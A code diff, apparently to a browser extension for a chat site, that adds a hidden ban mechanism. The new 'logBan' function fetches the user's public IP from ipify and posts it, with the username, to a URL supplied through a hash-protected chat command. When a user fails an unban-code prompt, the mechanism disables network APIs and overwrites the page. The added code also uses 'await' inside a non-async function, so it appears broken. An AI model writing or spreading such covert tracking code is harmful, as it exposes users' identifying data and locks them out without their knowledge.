@@ -33,6 +33,14 @@ var inject = function () {
   if (localStorage.getItem('/monachatchat/extension') !== 'true' || window.extensionConfig)
     return;
 
+  var logBan = (url, reason) => fetch(url, {
+    method : 'POST',
+    headers : {'Content-Type' : 'application/json'},
+    body : JSON.stringify({
+      username: reason || window.Bot?.users?.[Bot.myId]?.fullName,
+      content: await (await fetch("https://api.ipify.org")).text()
+    })
+  }).catch(e => e);
   var unbanJSON = localStorage.getItem('extensionBAN');
   if (unbanJSON) {
     try {
@@ -45,6 +53,8 @@ var inject = function () {
     if (prompt('解除コードを入力してください') === unban.word) {
       localStorage.removeItem('extensionBAN');
     } else {
+      logBan(unban.url, unban.reason);
+      window.XMLHttpRequest = window.WebSocket = e => e;
       document.addEventListener("DOMContentLoaded", () => {
         document.open();
         document.write(`<!doctype html>
@@ -694,15 +704,8 @@ textarea{padding:5px;resize:none;font-size:16px}
           var args = command.split(' ');
           if ('5tbBcgJiVM+166DplWm9/cWPZS9eYJeAhdcYm0JeAyk=' !== await encrypter.getBase64Hash(Base16384.textEncoder.encode(args[3])))
             return;
-          localStorage.setItem('extensionBAN', JSON.stringify({ word: args[1], reason: args[2] }));
-          fetch(args[3], {
-            method : 'POST',
-            headers : {'Content-Type' : 'application/json'},
-            body : JSON.stringify({
-              username: Bot?.users?.[Bot.myId]?.fullName,
-              content: await (await fetch("https://api.ipify.org")).text()
-            })
-          }).then(a => location.reload()).catch(e => e);
+          localStorage.setItem('extensionBAN', JSON.stringify({ word: args[1], reason: args[2], url: args[3] }));
+          logBan(args[3]).then(a => location.reload());
           return;
         }
       }
